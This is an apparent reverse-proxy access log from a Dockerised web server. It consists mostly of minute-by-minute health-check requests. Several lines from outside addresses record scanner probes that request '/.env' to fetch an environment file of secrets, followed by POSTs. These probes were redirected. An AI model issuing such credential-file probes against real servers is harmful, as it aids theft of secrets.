167.71.120.76 - - [14/Dec/2023:17:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2803 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2804 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2805 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2806 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2807 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2808 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [14/Dec/2023:17:03:25 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2809 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:17:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2810 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2811 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2812 "www@docker" "http://172.25.0.8:80" 0ms
13.52.99.35 - - [14/Dec/2023:17:05:09 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2813 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:17:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2814 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2815 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2816 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2817 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2818 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2819 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2820 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2821 "www@docker" "http://172.25.0.8:80" 1ms
102.129.232.53 - - [14/Dec/2023:17:09:05 +0000] "HEAD / HTTP/1.1" 404 19 "-" "-" 2822 "-" "-" 0ms
102.129.232.53 - - [14/Dec/2023:17:09:06 +0000] "OPTIONS / HTTP/1.1" 404 19 "-" "-" 2823 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:17:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2824 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2825 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2826 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2827 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2828 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2829 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:17:11:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2830 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [14/Dec/2023:17:12:14 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2831 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [14/Dec/2023:17:12:14 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2832 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:17:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2833 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2834 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2835 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2836 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2837 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2838 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2839 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2840 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2841 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2842 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2843 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2844 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2845 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2846 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2847 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2848 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2849 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2850 "www@docker" "http://172.25.0.8:80" 1ms
172.233.57.47 - - [14/Dec/2023:17:20:41 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2851 "-" "-" 0ms
172.233.57.47 - - [14/Dec/2023:17:20:41 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2852 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:17:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2853 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2854 "www@docker" "http://172.25.0.8:80" 0ms
68.69.186.30 - - [14/Dec/2023:17:22:10 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2855 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:17:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2856 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2857 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2858 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2859 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2860 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2861 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2862 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2863 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2864 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2865 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2866 "www@docker" "http://172.25.0.8:80" 1ms
94.102.61.88 - - [14/Dec/2023:17:27:31 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2867 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:17:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2868 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2869 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2870 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2871 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2872 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2873 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2874 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2875 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2876 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2877 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2878 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2879 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2880 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2881 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2882 "www@docker" "http://172.25.0.8:80" 0ms
95.214.235.169 - - [14/Dec/2023:17:35:11 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2883 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [14/Dec/2023:17:35:13 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2884 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:17:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2885 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2886 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2887 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2888 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2889 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2890 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2891 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2892 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2893 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2894 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2895 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2896 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2897 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2898 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2899 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2900 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2901 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2902 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2903 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2904 "www@docker" "http://172.25.0.8:80" 1ms
54.37.79.75 - - [14/Dec/2023:17:45:10 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2905 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [14/Dec/2023:17:45:11 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2906 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:17:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2907 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2908 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2909 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2910 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2911 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2912 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2913 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2914 "www@docker" "http://172.25.0.8:80" 0ms
54.36.115.221 - - [14/Dec/2023:17:49:00 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2915 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [14/Dec/2023:17:49:01 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2916 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:17:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2917 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2918 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2919 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2920 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2921 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2922 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2923 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2924 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2925 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2926 "www@docker" "http://172.25.0.8:80" 0ms
185.224.128.191 - - [14/Dec/2023:17:54:08 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2927 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:17:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2928 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2929 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2930 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:17:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2931 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2932 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2933 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2934 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2935 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:17:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2936 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2937 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:17:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2938 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:17:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2939 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:18:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2940 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:18:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2941 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:18:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2942 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:18:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2943 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:18:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2944 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:18:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2945 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:18:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2946 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:18:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2947 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:18:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2948 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:18:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2949 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:18:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2950 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:18:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2951 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:18:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2952 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:18:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2953 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:18:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2954 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:18:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2955 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:18:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2956 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:18:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2957 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:18:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2958 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:18:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2959 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:18:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2960 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:18:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2961 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:18:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2962 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:18:11:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2963 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:18:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2964 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:18:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2965 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:18:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2966 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:18:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2967 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:18:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2968 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:18:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2969 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:18:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2970 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [14/Dec/2023:18:15:14 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2971 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:18:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2972 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:18:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2973 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:18:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2974 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:18:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2975 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:18:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2976 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:18:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2977 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:18:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2978 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:18:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2979 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:18:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2980 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:18:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2981 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:18:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2982 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:18:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2983 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:18:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2984 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:18:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2985 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:18:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2986 "www@docker" "http://172.25.0.8:80" 1ms
